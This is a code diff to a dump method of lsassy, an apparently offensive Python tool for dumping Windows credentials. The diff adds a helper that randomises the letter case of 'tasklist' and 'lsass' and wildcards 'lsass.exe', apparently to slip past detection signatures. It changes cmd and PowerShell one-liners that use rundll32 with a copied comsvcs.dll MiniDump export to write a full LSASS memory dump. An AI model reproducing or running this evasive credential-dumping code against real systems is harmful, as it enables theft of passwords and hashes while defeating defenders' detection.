@@ -1,7 +1,6 @@
 from lsassy.dumpmethod.idumpmethod import IDumpMethod
 from lsassy.impacketfile import ImpacketFile
 import logging
-import time
 import random
 import string
 
@@ -35,12 +34,17 @@ class DumpMethod(IDumpMethod):
         self.comsvcs_copy_path = "\\Windows\\Temp\\"
         logging.debug("Comsvcss.dll will be copied to {}{}".format(self.comsvcs_copy_path, self.comsvcs_copy_name))
 
+    def random_case(self, s):
+        return ''.join(c.upper() if random.getrandbits(1) == 1 else c.lower() for c in s)
+
     def get_commands(self):
-        cmd_command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:{}{} #24 ^%B {}{} full""".format(
-            self.comsvcs_copy_path, self.comsvcs_copy_name, self.dump_path, self.dump_name
+        tasklist = self.random_case("tasklist")
+        lsass = self.random_case("lsass")
+        cmd_command = """for /f "tokens=1,2 delims= " ^%A in ('"{} /fi "Imagename eq {}.ex*" | find "lsass""') do rundll32.exe C:{}{} #24 ^%B {}{} full""".format(
+            tasklist, lsass, self.comsvcs_copy_path, self.comsvcs_copy_name, self.dump_path, self.dump_name
         )
-        pwsh_command = """rundll32.exe C:{}{} `#24 (Get-Process lsass).Id {}{} full""".format(
-             self.comsvcs_copy_path, self.comsvcs_copy_name, self.dump_path, self.dump_name
+        pwsh_command = """rundll32.exe C:{}{} `#24 (Get-Process {}).Id {}{} full""".format(
+             self.comsvcs_copy_path, self.comsvcs_copy_name, lsass, self.dump_path, self.dump_name
         )
         return {
             "cmd": cmd_command,
